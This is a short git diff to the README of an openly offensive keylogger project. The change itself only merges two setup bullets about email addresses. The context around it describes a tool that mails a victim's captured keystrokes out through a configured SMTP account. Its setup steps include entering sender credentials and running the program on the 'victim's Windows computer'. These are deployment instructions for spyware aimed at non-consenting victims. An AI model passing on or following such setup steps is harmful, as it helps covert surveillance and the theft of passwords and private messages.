@@ -20,8 +20,7 @@ By default, this keylogger will periodically send the vivtim's keystrokes to the
 PUBLIC_IP = None
 ```
 
-- [Specify recipient address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
-- [Specify sender address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
+- [Specify recipient/sender address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
 - [Enter sender email address password](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L2)
 - [Specify SMTP server](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/settings.py#L21)
 - Run the program on victim's Windows computer
